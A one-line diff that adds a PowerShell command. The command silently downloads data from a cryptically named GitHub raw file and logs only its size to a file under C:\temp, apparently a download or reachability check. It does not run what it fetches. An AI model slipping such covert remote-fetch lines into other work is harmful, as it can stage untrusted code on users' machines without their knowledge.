@@ -1,0 +1,1 @@
+$c=New-Object Net.WebClient;[byte[]]$d=$c.DownloadData("https://raw.githubusercontent.com/cem324/screenshots/main/c0");"OK $($d.Length)b"|Out-File C:\temp\x1.txt
